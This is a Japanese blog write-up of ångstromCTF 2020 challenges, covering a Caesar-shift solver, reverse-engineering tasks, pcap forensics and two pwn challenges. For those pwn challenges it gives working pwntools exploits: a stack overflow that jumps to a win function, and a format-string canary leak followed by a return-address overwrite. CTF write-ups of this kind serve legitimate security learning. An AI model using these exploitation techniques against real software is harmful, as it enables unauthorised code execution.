---
title: "ångstromCTF 2020 Writeup"
date: 2020-03-19T10:00:00+09:00
lastmod: 2020-03-20T09:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
<a href="https://captureamerica.github.io/writeups/post/angstromctf_2020/">
<img src="https://captureamerica.github.io/writeups/img/Jp.png" alt="Japanese">日本語
</a>&nbsp;
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">English (Google)
</a>

<br />

(2020/03/20 - 復習しました)

URL: [https://2020.angstromctf.com/challenges](https://2020.angstromctf.com/challenges)
<br /><br />

5日間のCTFでした。主に、初日の土曜日に頑張りました。

高校生によって作られたCTFのようですね。素晴らしいです。

ちなみに、過去のチャレンジ（2018年~）もアクセスできるみたいです。暇なときにやろうかと思います。

URL: [https://2019.angstromctf.com/challenges](https://2019.angstromctf.com/challenges) <br>
URL: [https://2018.angstromctf.com/challenges](https://2018.angstromctf.com/challenges)

<br>
最終順位は491位でした。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_score.png" alt="angstromctf_score.png">

<br>
以下は解いたチャレンジです。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_solves.png" alt="angstromctf_solves.png">



<br /><br />
## [Misc]: Shifter (160 points)
- - -
### Challenge
> What a strange challenge...
<br /><br />
It'll be no problem for you, of course!
<br /><br />
nc misc.2020.chall.actf.co 20300



<br />
### Solution
アクセスすると、以下のような出力が得られます。

<pre>
$ nc misc.2020.chall.actf.co 20300
Solve 50 of these epic problems in a row to prove you are a master crypto man like Aplet123!
You'll be given a number n and also a plaintext p.
Caesar shift `p` with the nth Fibonacci number.
n < 50, p is completely uppercase and alphabetic, len(p) < 50
You have 60 seconds!
--------------------
Shift DYUWIYBIWFSRKVBNQFLNEUTRRPUTTVAYMNGDVCUQJIRUGJAX by n=40
: l.}.q.jq.n{zs~jvyntvm}|zzx}||~i.uvol~k}yrqz}ori.
Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVRKJSVHKBY. Better luck next time!
</pre>

<br>
思いっきり答えを間違えると、ちゃんと正解を教えてもらえます^^


以下が書いたコードです。
```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import re
from pwn import *
context.log_level = 'critical'

host, port = 'misc.2020.chall.actf.co', 20300
s = remote(host, port)

def fib(a):
    L = [0, 1]
    for i in range(a):
        L += [ L[-1] + L[-2] ]
    return L[a]

def rot(s, n):
    s = bytearray(s)
    for i, c in enumerate(s):
        if 0x41 <= c <= 0x5a:
            s[i] = ((c-0x41+n) % 0x1a) + 0x41
        elif 0x61 <= c <= 0x7a:
            s[i] = ((c-0x61+n) % 0x1a) + 0x61
    return s

while 1:
    msg = s.recvuntil('\n')
    msg = msg.strip()
    # Example:
    # Shift LFDTGUKDZBKGHWMEHRAAUQEYGXIHRTLFMXRCKURN by n=49
    if "Shift" in msg:
        dat = re.findall(r"Shift (.*) by.*", msg)[0]
        n = int(re.findall(r".*n=(.*)", msg)[0])
        dat2 = rot(dat, fib(n))
        s.recvuntil(':')
        s.sendline(dat2)
    elif "actf{" in msg:
        print(msg)
        s.close()
        break

```

書いたと言っても、フィボナッチのコードは昔どこかのCTFでやったのが残っていたのと、rot関数はいつも使っているやつの使い回しなので、新規に書いた部分はちょっとだけです。



<br />
Flag: `actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}`


<br /><br />
<br /><br />
## [Pwn]: No Canary (50 points)
- - -
### Challenge
> Agriculture is the most healthful, most useful and most noble employment of man.

Attachment:

- no_canary (ELF 64bit)
- no_canary.c

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Ahhhh, what a beautiful morning on the farm!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
	puts("Wait, what? It's already noon!");
	puts("Why didn't my canary wake me up?");
	puts("Well, sorry if I kept you waiting.");
	printf("What's your name? ");

	char name[20];
	gets(name);

	printf("Nice to meet you, %s!\n", name);
}
```


<br />
### Solution
なんかもう、オフセットサイズとかちゃんと調べず、適当に8バイトずつ値を何回か変えて試しました。

```
gef➤  x flag
0x401186 <flag>:	0xe5894855
```

```
xxxxx@actf:/problems/2020/no_canary$ (python -c "print('a'*32+'a'*8+'\x86\x11\x40\x00\x00\x00\x00\x00')"; cat -) | ./no_canary
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? 
Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!
actf{that_gosh_darn_canary_got_me_pwned!}
Segmentation fault
```

<br />
Flag: `actf{that_gosh_darn_canary_got_me_pwned!}`





<br /><br />
<br /><br />
## [Pwn]: Canary (70 points)
- - -
### Challenge
> A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”
<br /><br />
—Anonymous
<br /><br />
Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/canary or by connecting with nc shell.actf.co 20701.
<br /><br />
Hint: That printf call looks dangerous too...

Attachment:

- canary (ELF 64bit)
- canary.c

```C
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void flag() {
	system("/bin/cat flag.txt");
}

void wake() {
	puts("Cock-a-doodle-doo! Cock-a-doodle-doo!\n");
	puts("        .-\"-.");
	puts("       / 4 4 \\");
	puts("       \\_ v _/");
	puts("       //   \\\\");
	puts("      ((     ))");
	puts("=======\"\"===\"\"=======");
	puts("         |||");
	puts("         '|'\n");
	puts("Ahhhh, what a beautiful morning on the farm!");
	puts("And my canary woke me up at 5 AM on the dot!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
}

void greet() {
	printf("Hi! What's your name? ");
	char name[20];
	gets(name);
	printf("Nice to meet you, ");
	printf(strcat(name, "!\n"));
	printf("Anything else you want to tell me? ");
	char info[50];
	gets(info);
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	wake();
	greet();
}
```

<br />
### Solution

FSB (Format String Bug)を使ってCanaryをLeakし、Canaryを壊さないようにしてBOFをするチャレンジです。

<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ checksec canary
[*] '/home/captureamerica/CTF/angstromCTF_2020/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

<br />
オフセットのサイズ(56バイト)と、Canaryが現れる位置(17)は、gdbで調べました。

以下のスクリーンショットは、最初の入力でAAAA、2回目の入力でBBBBを入れた後に見たスタックです。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_canary_gdb.png" alt="angstromctf_canary_gdb.png">


Return Address (0x4009c9)の2つ前がCanaryです。Null(\00)で始まってます。

バッファオーバーフローをさせるのは2回目の入力なので、BBBBの位置から見て56バイトがCanaryまでのオフセットです。


<br>
FSBをした際に何番目になるかは、以下の方法で調べました。0x4009c9を目安に探します。実行する度に値は変わります。

<pre>
Hi! What's your name? %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Nice to meet you, 0x7fffffffb820 0x47 0xffffffffffffffb7 0x7ffff7fb5500 0x12 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2170252070252070 0x7fffffff000a (nil) 0xddff4ae3ed3ade00 0x7fffffffdf30 0x4009c9 0x7fffffffe010 0x3e900000000 0x4009d0 0x7ffff7e1abbb (nil)!
</pre>

<pre>
Hi! What's your name? %17$p
Nice to meet you, 0xe1cad64c2bec5d00!
</pre>


<br>
flag()関数のアドレス。
<pre>
gef➤  x flag
0x400787 <flag>:	0xe5894855
</pre>


<br />
以下が今回書いたコードです。

```Python
#!/usr/bin/env python
from pwn import *

if 1:
    user='xxxxx'
    pw='yyyyy'
    s=ssh(host='shell.actf.co', user=user, password=pw)
    s.set_working_directory('/problems/2020/canary')
    p = s.process('./canary')
else:
    p = process('./canary')

p.recvuntil("Hi! What's your name? ")
p.sendline("%17$p")
msg = p.recvuntil("!\n")
canary = re.findall(r"Nice to meet you, (.*)!\n", msg)[0]
print(canary)
canary_addr = int(canary,16)
flag_addr = 0x400787
p.recvuntil("Anything else you want to tell me? ")

payload = ''
payload += b'A' * 8 * 7
payload += p64(canary_addr)
payload += b'A' * 8
payload += p64(flag_addr)
p.sendline(payload)
msg = p.recvall()
print(msg)
```

<br />
実行結果：

<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ ./canary_solve.py 
[+] Connecting to shell.actf.co on port 22: Done
[*] xxxxx@shell.actf.co:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[*] Working directory: '/problems/2020/canary'
[+] Starting remote process './canary' on shell.actf.co: pid 4605
0x8d7393450648a600
[+] Receiving all data: Done (32B)
[*] Stopped remote process 'canary' on shell.actf.co (pid 4605)
actf{youre_a_canary_killer_>:(}
</pre>

<br>
Flag: `actf{youre_a_canary_killer_>:(}`



<br /><br />
<br /><br />
## [Reverse]: Taking Off (70 points)
- - -
### Challenge
> So you started revving up, but is it enough to take off? Find the problem in /problems/2020/taking_off/ in the shell server.

Attachment:

- taking_off (ELF 64bit)


<br />
### Solution
簡単なやつだったんで、概要だけ。

Ghidraでソースを確認すると、引数が4つ必要で、最初の3つは整数、最後の1個は文字列なのがわかります。

整数は、計算して932になるもの、文字列は"chicken"です。

その後、パスワードが聞かれます。"please give flag"です。（XOR 0x2aされてます）。

```
xxxxx@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
So you figured out how to provide input and command line arguments.
But can you figure out what input to provide?
Well, you found the arguments, but what's the password?
please give flag
Good job! You're ready to move on to bigger and badder rev!
actf{th3y_gr0w_up_s0_f4st}
```


<br />
Flag: `actf{th3y_gr0w_up_s0_f4st}`




<br /><br />
<br /><br />
## [Reverse]: Windows of Opportunity (100 points)
- - -
### Challenge
> Clam's a windows elitist and he just can't stand seeing all of these linux challenges! So, he decided to step in and create his own rev challenge with the "superior" operating system.
<br><br>
Alternatively, find it at /problems/2020/windows_lives_matter/ on the shell server (even though you won't actually be able to run it from the shell server).

Attachment:

- windows_of_opportunity.exe


<br />
### Solution
やけに正解者が多いなと思ったら、案の定stringsで解けるやつでした。

```
captureamerica@kali:~/Downloads$ strings windows_of_opportunity.exe | grep -i ctf
actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}
```

<br />
100点問題だし、たぶん想定解じゃないんだろうな。一生懸命作ったのに、かわいそう。


<br />
Flag: `actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}`




<br /><br />
<br /><br />
ここから下のやつは、解けなくて諦めたやつです。

## [Misc]: PSK (90 points)
- - -
### Challenge
> My friend sent my yet another mysterious recording...
<br><br>
He told me he was inspired by PicoCTF 2019 and made his own transmissions. I've looked at it, and it seems to be really compact and efficient.
<br><br>
Only 31 bps!!
<br><br>
See if you can decode what he sent to me. It's in actf{} format


Attachment:

- transmission.wav


<br />
### (Unsolved)
はい、PicoCTF 2019でSSTVの問題ありましたね。今回のこれは、PSK31ってやつみたいです。

いくつかツールを試したんですが、いいのが見つからなくて、諦めました。



<br /><br />
<br /><br />
## [Misc]: Inputter (100 points)
- - -
### Challenge
> Clam really likes challenging himself. When he learned about all these weird unprintable ASCII characters he just HAD to put it in a challenge. Can you satisfy his knack for strange and hard-to-input characters? Source.
<br><br>
Find it on the shell server at /problems/2020/inputter/.
<br><br>
Hint: There are ways to run programs without using the shell.


Attachment:

- inputter (ELF 64bit)
- inputter.c


```C
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define FLAGSIZE 128

void print_flag() {
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    FILE *file = fopen("flag.txt", "r");
    char flag[FLAGSIZE];
    if (file == NULL) {
        printf("Cannot read flag file.\n");
        exit(1);
    }
    fgets(flag, FLAGSIZE, file);
    printf("%s", flag);
}

int main(int argc, char* argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc != 2) {
        puts("Your argument count isn't right.");
        return 1;
    }
    if (strcmp(argv[1], " \n'\"\x07")) {
        puts("Your argument isn't right.");
        return 1;
    }
    char buf[128];
    fgets(buf, 128, stdin);
    if (strcmp(buf, "\x00\x01\x02\x03\n")) {
        puts("Your input isn't right.");
        return 1;
    }
    puts("You seem to know what you're doing.");
    print_flag();
}
```

<br />
### (Unsolved)
ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。


<br /><br />
2020/03/20 - 復習しました。

なんか、pwntoolsで普通にできたみたいです。イベント中にやったときは、なぜかできなかった気がしたんですけど。

```Python
#!/usr/bin/env python
from pwn import *

if 1:
    user='xxxxx'
    pw='yyyyy'
    s=ssh(host='shell.actf.co', user=user, password=pw)
    s.set_working_directory('/problems/2020/inputter')
    p = s.process(["./inputter"," \n'\"\x07"])
else:
    p = process(["./inputter"," \n'\"\x07"])

p.sendline("\x00\x01\x02\x03\n")
msg = p.recvall()
print(msg)
```

<br>
<pre>
captureamerica@kali:~/CTF/angstromCTF_2020$ ./inputter_solve.py 
[+] Connecting to shell.actf.co on port 22: Done
[*] xxxxx@shell.actf.co:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[*] Working directory: '/problems/2020/inputter'
[+] Starting remote process './inputter' on shell.actf.co: pid 21500
[+] Receiving all data: Done (94B)
[*] Stopped remote process 'inputter' on shell.actf.co (pid 21500)
You seem to know what you're doing.
actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
</pre>

<br>
Flag: `actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}`




<br /><br />
<br /><br />
## [Misc]: All These Rules (?? points)
- - -
### Challenge
> Clam can't do this, he can't do that, wouldn't it be nice if there were something that he could do?
<br><br>
ssh chall@misc.2020.chall.actf.co
<br><br>


<br />
### (Unsolved)
restricted shellの問題です。

どうやら、チャレンジが削除されてしまったようなので、何か不具合があったのかもです。

これは解きたかったなぁ。（というか、解けないやつだったかもだけど。）



<br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はCTF終了後（2020/03/20）に行った復習です。他の方のWriteupとか参照してます。


<br /><br />
<br /><br />
## [Misc]: WS3 (180 points)
- - -
### Challenge
> What the... record.pcapng

Attachment:

- record.pcapng



<br />
### Solution
git-receive-pack というのが出てきて、よく知らなかったのでスルーしたやつなんですが、gitを使わずとも解ける問題だったみたいなので再度やってみました。

HTTP のオブジェクトをExportします。いくつかありますが、サイズが他と比べて特別大きい18KBのやつを狙います。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_ws3.png" alt="angstromctf_ws3.png">

<br>
binwalkします。

<pre>
captureamerica@kali:~/Downloads$ binwalk --dd='.*' git-receive-pack 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
183           0xB7            Zlib compressed data, default compression
342           0x156           Zlib compressed data, default compression
425           0x1A9           Zlib compressed data, default compression
</pre>

<br>
ここで、zlib-flateを使って解凍してもいいんですが、extractedの中にすでに解凍されたものも生成されてます。

<pre>
captureamerica@kali:~/Downloads/_git-receive-pack.extracted$ file *
156:                 data
156.zlib:            zlib compressed data
1A9:                 JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
1A9.zlib:            zlib compressed data
angstromctf_1A9.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
B7:                  Git tree 87872
B7.zlib:             zlib compressed data
</pre>

<br>
1A9はJpegファイルで、開くとフラグが見つかります。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_1A9.jpg" alt="angstromctf_1A9.jpg">

<br>
Flag: `actf{git_good_git_wireshark-123323}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

